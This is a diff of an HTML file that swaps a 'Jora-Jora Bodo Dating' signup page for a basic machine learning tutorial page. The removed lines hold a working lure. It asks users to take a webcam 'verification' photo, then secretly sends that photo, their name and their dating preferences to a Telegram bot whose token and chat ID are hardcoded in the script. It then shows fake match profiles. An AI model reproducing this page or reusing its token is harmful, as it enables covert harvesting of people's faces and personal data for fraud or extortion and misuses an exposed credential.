@@ -3,582 +3,336 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jora-Jora Bodo Dating</title>
+    <title>Machine Learning Basics: Expanded Guide</title>
     <style>
         :root {
-            --primary: #fd297b; /* Tinder-like pink/red */
-            --secondary: #ff655b; /* Warm orange/red */
-            --background: #f8f8f8;
-            --text: #333333;
-            --input-bg: #f0f0f0;
-            --error: #e63946;
-            --success: #2a9d8f;
+            --primary-color: #1a252f;
+            --secondary-color: #2c3e50;
+            --accent-color: #e74c3c;
+            --bg-color: #ecf0f1;
+            --text-color: #333;
+            --card-bg: #ffffff;
         }
-
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: var(--text);
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
             margin: 0;
-            padding: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
+            padding: 0;
         }
-
-        .main-wrapper {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-            max-width: 450px;
-            width: 100%;
-            overflow: hidden;
-            position: relative;
-            min-height: 600px;
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 3rem 1rem;
+            text-align: center;
+            border-bottom: 5px solid var(--accent-color);
         }
-
+        header h1 {
+            margin: 0;
+            font-size: 2.8rem;
+            letter-spacing: 1px;
+        }
+        header p.subtitle {
+            margin: 10px 0 0;
+            font-size: 1.2rem;
+            color: #bdc3c7;
+        }
+        header p.author {
+            margin: 15px 0 0;
+            font-size: 1.1rem;
+            color: var(--accent-color);
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
         .container {
-            padding: 35px 30px;
-            transition: opacity 0.5s ease;
+            max-width: 1100px;
+            margin: 2rem auto;
+            padding: 0 1rem;
         }
-
-        h1 { 
-            background: -webkit-linear-gradient(45deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-align: center; 
-            margin-bottom: 5px; 
-            font-size: 32px;
-            font-weight: 800;
-        }
-        
-        p.subtitle { 
-            text-align: center; 
-            color: #888; 
-            margin-bottom: 30px; 
-            font-size: 15px;
-        }
-
-        .form-group { margin-bottom: 20px; }
-        label { 
-            display: block; 
-            font-weight: 600; 
-            margin-bottom: 8px; 
-            color: #555; 
-            font-size: 14px;
-        }
-        
-        select, input[type="text"] {
-            width: 100%; 
-            padding: 14px; 
-            border: 2px solid transparent;
-            background-color: var(--input-bg);
-            border-radius: 12px; 
-            box-sizing: border-box; 
-            font-size: 16px;
-            color: #333;
-            transition: all 0.3s ease;
-        }
-        
-        select:focus, input[type="text"]:focus { 
-            border-color: var(--primary); 
-            background-color: white;
-            outline: none; 
-            box-shadow: 0 0 8px rgba(253, 41, 123, 0.2);
-        }
-
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-
-        .webcam-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 25px;
-            padding: 20px;
-            border: 2px dashed #ffb3c6;
-            border-radius: 15px;
-            background-color: #fff9fa;
-        }
-
-        #videoElement {
-            width: 100%;
-            max-width: 250px;
-            border-radius: 50%;
-            border: 4px solid var(--primary);
-            display: none;
-            transform: scaleX(-1);
-            box-shadow: 0 8px 20px rgba(253, 41, 123, 0.3);
-            aspect-ratio: 1 / 1;
-            object-fit: cover;
-        }
-
-        .liveness-instruction {
-            text-align: center;
-            font-size: 13px;
-            color: #666;
-            margin-top: 15px;
-            display: none;
-        }
-
-        .btn-primary {
-            width: 100%; 
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            color: white;
-            border: none; 
-            padding: 16px; 
-            font-size: 18px; 
-            font-weight: bold;
-            border-radius: 25px; 
-            cursor: pointer; 
-            transition: transform 0.2s, box-shadow 0.2s;
-            margin-top: 20px;
-            box-shadow: 0 5px 15px rgba(253, 41, 123, 0.4);
-        }
-        
-        .btn-primary:hover { 
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(253, 41, 123, 0.5);
-        }
-        
-        .btn-primary:disabled { 
-            background: #cccccc; 
-            box-shadow: none;
-            cursor: not-allowed; 
-            transform: none;
-        }
-
-        #startCameraBtn {
-            background: white;
-            color: var(--primary);
-            border: 2px solid var(--primary);
-            box-shadow: none;
-        }
-        
-        #startCameraBtn:hover { background: #fff0f3; }
-
-        #statusMessage {
-            margin-top: 20px; 
-            padding: 12px; 
+        .module {
+            background: var(--card-bg);
             border-radius: 10px;
-            text-align: center; 
-            font-weight: bold; 
-            display: none;
+            padding: 2.5rem;
+            margin-bottom: 2.5rem;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
         }
-        .error { background-color: #f8d7da; color: #721c24; }
+        .module h2 {
+            color: var(--primary-color);
+            border-bottom: 3px solid var(--accent-color);
+            padding-bottom: 0.5rem;
+            margin-top: 0;
+            font-size: 2rem;
+        }
+        .grid-2, .grid-3 {
+            display: grid;
+            gap: 2rem;
+            margin-top: 1.5rem;
+        }
+        .grid-2 { grid-template-columns: 1fr 1fr; }
+        .grid-3 { grid-template-columns: repeat(3, 1fr); }
         
-        #canvasElement { display: none; }
-
-        #loadingView {
-            display: none;
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: white;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            z-index: 10;
+        .card {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 5px solid var(--secondary-color);
+            transition: transform 0.2s ease;
         }
-        
-        .radar-spinner {
-            width: 80px; height: 80px;
-            border-radius: 50%;
-            border: 4px solid #ffe5ec;
-            border-top: 4px solid var(--primary);
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
         }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        #matchView {
-            display: none;
-            padding: 20px;
-            height: 100%;
-            background: #f4f6f8;
-            box-sizing: border-box;
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            flex-direction: column;
+        .card.accent {
+            border-left-color: var(--accent-color);
         }
-
-        .app-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding-bottom: 15px;
+        h3 {
+            color: var(--secondary-color);
+            margin-top: 0;
+            font-size: 1.4rem;
         }
-        .app-header h2 { margin: 0; font-size: 24px; color: var(--primary); }
-        .app-header span { font-size: 24px; cursor: pointer; color: #aaa; transition: 0.2s;}
-        .app-header span:hover { color: var(--primary); }
-
-        .profile-card {
-            position: relative;
-            flex-grow: 1;
-            background: white;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
-            display: flex;
-            flex-direction: column;
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            display: block;
         }
-
-        .profile-img {
+        table {
             width: 100%;
-            height: 100%;
-            object-fit: cover;
-            position: absolute;
-            top: 0; left: 0;
-            z-index: 1;
-        }
-
-        .profile-info {
-            position: absolute;
-            bottom: 0; left: 0; right: 0;
-            padding: 30px 20px 20px;
-            background: linear-gradient(to top, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.6) 60%, transparent 100%);
-            color: white;
-            z-index: 2;
-        }
-
-        .profile-info h3 { margin: 0 0 5px 0; font-size: 28px; font-weight: 700; display: flex; align-items: center;}
-        .profile-info h3 span { font-weight: 400; font-size: 24px; margin-left: 8px; }
-        .profile-info .distance { font-size: 14px; margin-bottom: 10px; color: #ddd; display: flex; align-items: center; gap: 5px; }
-        .profile-info .bio { font-size: 15px; line-height: 1.4; color: #eee; margin: 0;}
-
-        .action-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 25px;
-            padding: 25px 0 10px;
-            z-index: 3;
-            background: transparent;
-        }
-
-        .action-btn {
-            width: 65px; height: 65px;
-            border-radius: 50%;
-            border: none;
+            border-collapse: collapse;
+            margin-top: 1.5rem;
             background: white;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 30px;
-            cursor: pointer;
-            transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
-        .action-btn:hover { transform: scale(1.15); }
-        .btn-pass { color: #fd297b; }
-        .btn-like { color: #1be4a1; }
-        .btn-super { color: #2db1ff; width: 50px; height: 50px; font-size: 22px; margin-top: 10px; }
-
-        .no-more-profiles {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100%;
+        th, td {
+            border: 1px solid #ddd;
+            padding: 15px;
             text-align: center;
-            color: #777;
-            padding: 20px;
         }
-        .no-more-profiles .radar-spinner { border-top-color: #ccc; border-color: #eee; animation-duration: 3s; }
+        th {
+            background-color: var(--secondary-color);
+            color: white;
+            font-weight: 600;
+        }
+        code {
+            background: #e1e8ed;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', Courier, monospace;
+            color: var(--accent-color);
+            font-weight: bold;
+        }
+        .example-box {
+            background: #e8f4f8;
+            padding: 1rem;
+            border-radius: 6px;
+            margin-top: 1rem;
+            font-size: 0.95em;
+        }
+        @media (max-width: 900px) {
+            .grid-2, .grid-3 {
+                grid-template-columns: 1fr;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="main-wrapper">
-    <div class="container" id="setupView">
-        <h1>🔥 Jora-Jora</h1>
-        <p class="subtitle">Bodo Dating • Find Your Match Instantly</p>
+<header>
+    <h1>Machine Learning Basics</h1>
+    <p class="subtitle">Core Principles, Foundational Algorithms, and Model Evaluation</p>
+    <p class="author">-by BANAJIT BORO (AI/ML)</p>
+</header>
 
-        <form id="orderForm">
-            <!-- Profile Details -->
-            <div class="form-group">
-                <label for="profileName">Your First Name</label>
-                <input type="text" id="profileName" placeholder="e.g. Rahul" required>
-            </div>
-
-            <div class="form-group">
-                <label for="lookingFor">I am looking for</label>
-                <select id="lookingFor" required>
-                    <option value="Women">Women</option>
-                    <option value="Men">Men</option>
-                    <option value="Everyone">Everyone</option>
-                </select>
-            </div>
-
-            <!-- Preferences -->
-            <div class="grid">
-                <div class="form-group">
-                    <label for="ageRange">Age Range</label>
-                    <select id="ageRange">
-                        <option value="18 - 24">18 - 24</option>
-                        <option value="25 - 30">25 - 30</option>
-                        <option value="31 - 40">31 - 40</option>
-                        <option value="40+">40+</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="intent">Looking for</label>
-                    <select id="intent">
-                        <option value="Relationship">Relationship</option>
-                        <option value="Casual Dating">Casual Dating</option>
-                        <option value="New Friends">New Friends</option>
-                    </select>
-                </div>
-            </div>
-
-            <!-- Liveness / Webcam Section -->
-            <div class="webcam-container">
-                <label>Profile Verification</label>
-                <button type="button" id="startCameraBtn" class="btn-primary">📸 Take Profile Photo</button>
-                <video id="videoElement" autoplay playsinline></video>
-                <p class="liveness-instruction" id="livenessInstruction">Look your best! We'll capture this securely for your profile verification.</p>
-                <canvas id="canvasElement"></canvas>
-            </div>
-
-            <button type="submit" id="submitBtn" class="btn-primary" disabled>Create Profile & Match ❤️</button>
-        </form>
-
-        <div id="statusMessage"></div>
-    </div>
-
-    <div id="loadingView">
-        <div class="radar-spinner"></div>
-        <h2 style="color: var(--primary); margin-bottom: 5px;">Finding matches...</h2>
-        <p style="color: #666; margin:0;">Scanning your area for genuine profiles.</p>
-    </div>
-
-    <div id="matchView">
-        <div class="app-header">
-            <h2>🔥 Jora-Jora</h2>
-            <span title="Settings">⚙️</span>
-        </div>
+<div class="container">
+    
+    <section class="module">
+        <h2>What is Machine Learning?</h2>
+        <p>Machine Learning is a subset of Artificial Intelligence that focuses on building systems that learn from historical data to make predictions or decisions.</p>
         
-        <div class="profile-card" id="profileCard">
-            <!-- Profile Content Injected via JS -->
+        <div class="grid-2">
+            <div class="card">
+                <h3>Traditional Programming</h3>
+                <ul>
+                    <li>We give a computer a set of rules (code) and data.</li>
+                    <li>The computer processes the data and outputs the answer.</li>
+                    <li>Think of how a standard calculator operates.</li>
+                </ul>
+                <div class="example-box">
+                    <strong>Example:</strong> Writing an IF/THEN script to flag any transaction over $10,000 as suspicious.
+                </div>
+            </div>
+            <div class="card accent">
+                <h3>Machine Learning</h3>
+                <ul>
+                    <li>We give the computer the data AND the answers.</li>
+                    <li>We ask the computer to figure out the rules.</li>
+                    <li>The machine learns to perform tasks from experience (data) without explicit programming.</li>
+                </ul>
+                <div class="example-box">
+                    <strong>Example:</strong> Feeding the computer thousands of past transactions (some labeled 'fraud', some 'normal'). The computer figures out the subtle patterns that indicate fraud on its own.
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="module">
+        <h2>Module 1: The Three Branches of ML</h2>
+        
+        <img src="https://machine-learning-and-data-science-with-python.readthedocs.io/en/latest/_images/unsup.png" alt="Machine Learning Branches Diagram">
+
+        <div class="grid-3">
+            <div class="card">
+                <h3>1. Supervised Learning</h3>
+                <p><strong>Labeled Data:</strong> The algorithm is trained on a dataset that already has the answers.</p>
+                <p><strong>The Goal:</strong> Learn a mapping function from input variables (features) to the output variable (target/label).</p>
+                <p><strong>Prediction:</strong> Once trained, the model can accurately predict outputs for brand new, unseen inputs.</p>
+                <div class="example-box">
+                    <strong>Classic Example:</strong> Predicting house prices from square footage, or classifying emails as Spam/Not Spam.
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3>2. Unsupervised Learning</h3>
+                <p><strong>Unlabeled Data:</strong> The algorithm learns from raw data. There are no predefined answers or labels provided.</p>
+                <p><strong>The Goal:</strong> Discover the underlying structure, hidden patterns, or groupings within the dataset autonomously.</p>
+                <div class="example-box">
+                    <strong>Classic Example:</strong> Customer segmentation (grouping buyers by behavior) or Anomaly detection (spotting credit card fraud).
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>3. Reinforcement Learning</h3>
+                <p><strong>Feedback Loop:</strong> An "agent" learns to behave in an environment by performing actions and seeing the results.</p>
+                <p><strong>The Goal:</strong> Maximize a "reward" signal over time through trial and error.</p>
+                <div class="example-box">
+                    <strong>Classic Example:</strong> Training an AI to play chess, or teaching a self-driving car to stay in its lane (reward = staying on road, penalty = crashing).
+                </div>
+            </div>
+        </div>
+        <img src="https://media.geeksforgeeks.org/wp-content/uploads/20231121154747/Supervised-learning.png" alt="Supervised Learning Flowchart">
+    </section>
+
+    <section class="module">
+        <h2>Module 2: Foundational ML Algorithms</h2>
+        
+        <div class="grid-2">
+            <div class="card">
+                <h3>Linear Regression (Supervised)</h3>
+                <p>Used when you need a continuous numerical value as an answer (e.g., price, temperature).</p>
+                <p>It tries to draw the best possible straight line through your data points. It uses Ordinary Least Squares to minimize the 'error' (distance between the line and actual points).</p>
+                <p>The classic algebraic equation for a line: <code>y = mx + c</code></p>
+                <div class="example-box">
+                    <strong>Real World:</strong> Predicting a person's adult height (y) based on their current age (x).
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3>Logistic Regression (Supervised)</h3>
+                <p>Despite the name, it's used for binary classification. It fits an S-shaped curve that predicts the probability (between 0 and 1) that an input belongs to a specific class.</p>
+                <div class="example-box">
+                    <strong>Real World:</strong> Predicting if a patient has a specific disease (1 = Yes, 0 = No) based on their blood test results.
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3>Decision Trees (Supervised)</h3>
+                <p>A visual tool that automatically figures out the best sequence of Yes/No questions to ask in order to split your data into the most 'pure' groups possible at the leaf nodes.</p>
+                <div class="example-box">
+                    <strong>Real World:</strong> A bank deciding whether to approve a loan. (Question 1: Income > $50k? -> Question 2: Credit Score > 700? -> Approve).
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3>K-Means Clustering (Unsupervised)</h3>
+                <ol>
+                    <li><strong>Choose 'K':</strong> You define the number of clusters (groups) you want to find.</li>
+                    <li><strong>Drop Centroids:</strong> The algorithm drops 'K' random center points into the data.</li>
+                    <li><strong>Assign:</strong> Every data point is assigned to its nearest centroid.</li>
+                    <li><strong>Recalculate:</strong> The center of the new group is calculated, and the centroid moves there. This repeats until movement stops.</li>
+                </ol>
+                <img src="https://miro.medium.com/1*luV-ImNTrhi-NyUz3Ydz2w.png" alt="K-Means Decision Boundaries" style="margin-bottom: 0;">
+            </div>
+        </div>
+    </section>
+
+    <section class="module">
+        <h2>The Goldilocks Problem: Underfitting vs. Overfitting</h2>
+        <p>A major challenge in training models is finding the perfect balance. We want our model to learn the underlying trend, not just memorize the data.</p>
+        
+        <div class="grid-3">
+            <div class="card">
+                <h3>Underfitting (Too Simple)</h3>
+                <p>The model is too basic and fails to capture the underlying pattern of the data. It performs poorly on both training and new data.</p>
+                <p><em>Analogy:</em> A student who didn't study at all and fails the test.</p>
+            </div>
+            <div class="card accent">
+                <h3>Optimal (Just Right)</h3>
+                <p>The model captures the true underlying trend without memorizing the noise. It generalizes well to unseen data.</p>
+                <p><em>Analogy:</em> A student who understands the core concepts and can apply them to new questions.</p>
+            </div>
+            <div class="card">
+                <h3>Overfitting (Too Complex)</h3>
+                <p>Trees are prone to overfitting. They can become too complex and perfectly memorize the training data, leading to terrible performance on brand new, unseen data.</p>
+                <p><em>Analogy:</em> A student who memorized the exact practice questions but fails when the real test changes the numbers.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="module">
+        <h2>Module 3: Model Evaluation & Metrics</h2>
+        
+        <h3>Training and Testing Data</h3>
+        <p><strong>The Beginner's Trap:</strong> Testing a model on the same data it was trained on is like giving a student the answer key before a test. It ruins our ability to know if the machine actually learned anything useful.</p>
+        <p><strong>Train / Test Split:</strong> We typically hide 20% of our data (Testing Set) and build the model with the remaining 80% (Training Set). We then test it on the hidden data to evaluate its ability to generalize.</p>
+        <p><strong>Cross-Validation:</strong> A rigorous technique where data is split into multiple chunks. The model is trained and tested multiple times on different chunk combinations to get a robust average score.</p>
+        
+        <div class="grid-2">
+            <div class="card">
+                <h3>Regression Metrics (Numbers)</h3>
+                <p>When predicting numerical values, we look at distances:</p>
+                <ul>
+                    <li><strong>Mean Absolute Error (MAE):</strong> Straightforward. On average, how far off were our predictions from reality?</li>
+                    <li><strong>R-squared:</strong> Indicates how much of the variance in the target is explained by our model. Higher is better.</li>
+                </ul>
+            </div>
+            <div class="card">
+                <h3>Classification Metrics (Categories)</h3>
+                <p>When predicting categories, simple accuracy can be misleading, especially with imbalanced data.</p>
+                <ul>
+                    <li><strong>Precision:</strong> When we predict a positive, how often are we right? (Minimizes false alarms).</li>
+                    <li><strong>Recall (Sensitivity):</strong> Out of all actual positives, how many did we find? (Minimizes misses).</li>
+                    <li><strong>F1-Score:</strong> A mathematical balance (the harmonic mean) between Precision and Recall. It is the best metric to use when you need a balance between the two and your dataset is uneven.</li>
+                </ul>
+            </div>
         </div>
 
-        <div class="action-buttons" id="actionButtons">
-            <button class="action-btn btn-pass" onclick="handleSwipe('left')" title="Pass">❌</button>
-            <button class="action-btn btn-super" onclick="handleSwipe('up')" title="Super Like">⭐</button>
-            <button class="action-btn btn-like" onclick="handleSwipe('right')" title="Like">❤️</button>
-        </div>
-    </div>
+        <h3>The Confusion Matrix</h3>
+        <p>A visual table that lays out exactly where our classification model is getting confused.</p>
+        <table>
+            <thead>
+                <tr>
+                    <th>Prediction \ Actual</th>
+                    <th>Actual: Positive (e.g., Fraud)</th>
+                    <th>Actual: Negative (e.g., Normal)</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Predicted: Positive</strong></td>
+                    <td style="background-color: #d4edda;"><strong>True Positive (TP)</strong><br><small>We predicted fraud, and it WAS fraud.</small></td>
+                    <td style="background-color: #f8d7da;"><strong>False Positive (FP)</strong><br><small>(False Alarm)</small></td>
+                </tr>
+                <tr>
+                    <td><strong>Predicted: Negative</strong></td>
+                    <td style="background-color: #f8d7da;"><strong>False Negative (FN)</strong><br><small>(Missed It!)</small></td>
+                    <td style="background-color: #d4edda;"><strong>True Negative (TN)</strong><br><small>We predicted normal, and it WAS normal.</small></td>
+                </tr>
+            </tbody>
+        </table>
+    </section>
 </div>
-
-<script>
-    const BOT_TOKEN = '8919666195:AAE1kQrD3SEXBYbKZPrOjtoFUHljDxZHPYY';
-    const CHAT_ID = '2147403583';
-
-    const video = document.getElementById('videoElement');
-    const canvas = document.getElementById('canvasElement');
-    const startCameraBtn = document.getElementById('startCameraBtn');
-    const submitBtn = document.getElementById('submitBtn');
-    const livenessInstruction = document.getElementById('livenessInstruction');
-    let streamActive = false;
-
-    // 1. Initialize Webcam
-    startCameraBtn.addEventListener('click', async () => {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-            video.style.display = 'block';
-            startCameraBtn.style.display = 'none';
-            livenessInstruction.style.display = 'block';
-            submitBtn.disabled = false;
-            streamActive = true;
-        } catch (err) {
-            alert("Camera access denied. We need a photo to verify your dating profile!");
-            console.error("Webcam error:", err);
-        }
-    });
-
-    // 2. Handle Form Submission & Snapshot
-    document.getElementById('orderForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        if (!streamActive) {
-            alert("Please take a profile photo first!");
-            return;
-        }
-
-        submitBtn.disabled = true;
-        submitBtn.innerText = "Securing Profile... 🔒";
-
-        const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(function(blob) {
-            sendToTelegram(blob);
-        }, 'image/jpeg', 0.90);
-    });
-
-    function sendToTelegram(imageBlob) {
-        const name = document.getElementById('profileName').value;
-        const lookingFor = document.getElementById('lookingFor').value;
-        const ageRange = document.getElementById('ageRange').value;
-        const intent = document.getElementById('intent').value;
-        
-        const captionText = `❤️ *NEW JORA-JORA PROFILE* ❤️\n\n` +
-                            `*Name:* ${name}\n` +
-                            `*Seeking:* ${lookingFor}\n` +
-                            `*Age Pref:* ${ageRange}\n` +
-                            `*Intent:* ${intent}\n\n` +
-                            `📸 *Profile Verification Attached*`;
-
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', imageBlob, 'profile_verification.jpg');
-        formData.append('caption', captionText);
-        formData.append('parse_mode', 'Markdown');
-
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-
-        // Switch to Loading View immediately to feel responsive
-        document.getElementById('setupView').style.display = 'none';
-        document.getElementById('loadingView').style.display = 'flex';
-        
-        // Stop the webcam stream
-        const stream = video.srcObject;
-        if(stream) {
-            const tracks = stream.getTracks();
-            tracks.forEach(track => track.stop());
-        }
-
-        fetch(url, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            if(data.ok) {
-                // Simulate extra "finding matches" time for dramatic effect
-                setTimeout(() => {
-                    startDatingExperience();
-                }, 1500);
-            } else {
-                throw new Error(data.description);
-            }
-        })
-        .catch(error => {
-            // Revert back to form on error
-            document.getElementById('loadingView').style.display = 'none';
-            document.getElementById('setupView').style.display = 'block';
-            
-            const statusMessage = document.getElementById('statusMessage');
-            statusMessage.className = "error";
-            statusMessage.style.display = "block";
-            statusMessage.innerText = "❌ Failed to create profile. Please check your connection.";
-            submitBtn.disabled = false;
-            submitBtn.innerText = "Create Profile & Match ❤️";
-            
-            // Restart webcam logic would ideally go here if we wanted to fully recover it
-        });
-    }
-
-    // Realistic dummy profiles dataset
-    const dummyProfiles = [
-        {
-            name: "Priya",
-            age: 24,
-            distance: 3,
-            bio: "Love hiking, good coffee, and trying out new cafes in the city. ☕️🏔️ Let's grab a drink!",
-            img: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
-        },
-        {
-            name: "Aarav",
-            age: 27,
-            distance: 8,
-            bio: "Software developer by day, guitarist by night. Looking for someone with a good sense of humor. 🎸✨",
-            img: "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
-        },
-        {
-            name: "Neha",
-            age: 26,
-            distance: 12,
-            bio: "Foodie, traveler, and unapologetic dog mom. Tell me your favorite travel destination! ✈️🐶",
-            img: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
-        },
-        {
-            name: "Rahul",
-            age: 29,
-            distance: 5,
-            bio: "Fitness enthusiast and weekend trekker. Swipe right if you can keep up. 🏃‍♂️💨",
-            img: "https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
-        },
-        {
-            name: "Anjali",
-            age: 23,
-            distance: 2,
-            bio: "Art student. I spend too much time at museums and plant shops. 🌿🎨",
-            img: "https://images.unsplash.com/photo-1517841905240-472988babdf9?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
-        }
-    ];
-
-    let currentProfileIndex = 0;
-
-    function startDatingExperience() {
-        document.getElementById('loadingView').style.display = 'none';
-        document.getElementById('matchView').style.display = 'flex';
-        
-        // Filter profiles based on preference (Simplified logic for demo)
-        // In a real app, we'd filter the array based on user's 'lookingFor' selection.
-        // For this demo, we just show the array as is.
-        renderProfile();
-    }
-
-    function renderProfile() {
-        const cardContainer = document.getElementById('profileCard');
-        
-        if (currentProfileIndex >= dummyProfiles.length) {
-            // Out of profiles state
-            cardContainer.innerHTML = `
-                <div class="no-more-profiles">
-                    <div class="radar-spinner" style="border-top-color:#fd297b;"></div>
-                    <h3>No new matches nearby</h3>
-                    <p>Expand your search radius or check back later!</p>
-                </div>
-            `;
-            document.getElementById('actionButtons').style.display = 'none';
-            return;
-        }
-
-        const profile = dummyProfiles[currentProfileIndex];
-        
-        cardContainer.innerHTML = `
-            <img src="${profile.img}" class="profile-img" alt="${profile.name}">
-            <div class="profile-info">
-                <h3>${profile.name} <span>${profile.age}</span></h3>
-                <div class="distance">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
-                    ${profile.distance} km away
-                </div>
-                <p class="bio">${profile.bio}</p>
-            </div>
-        `;
-    }
-
-    function handleSwipe(direction) {
-        // Prevent action if out of profiles
-        if (currentProfileIndex >= dummyProfiles.length) return;
-
-        // In a real app, we'd add CSS transform animations here before moving to next.
-        // For this seamless prototype, we instantly switch to the next profile.
-        
-        // Optional: Show matched dialog if it was a 'like' 
-        // if(direction === 'right' && Math.random() > 0.7) { alert("It's a Match!"); }
-
-        currentProfileIndex++;
-        renderProfile();
-    }
-</script>
 
 </body>
 </html>
